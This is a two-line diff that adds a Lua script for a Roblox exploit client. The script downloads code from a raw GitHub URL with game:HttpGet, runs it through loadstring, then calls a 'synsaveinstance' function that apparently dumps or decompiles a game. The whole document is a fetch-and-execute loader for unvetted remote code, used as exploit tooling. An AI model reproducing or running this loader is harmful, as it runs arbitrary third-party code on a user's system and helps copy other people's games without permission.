@@ -1,0 +1,2 @@
+local synsaveinstance = loadstring(game:HttpGet("https://raw.githubusercontent.com/najoaxisa-crypto/homework./refs/heads/main/decompileSetup", true))()
+synsaveinstance({})
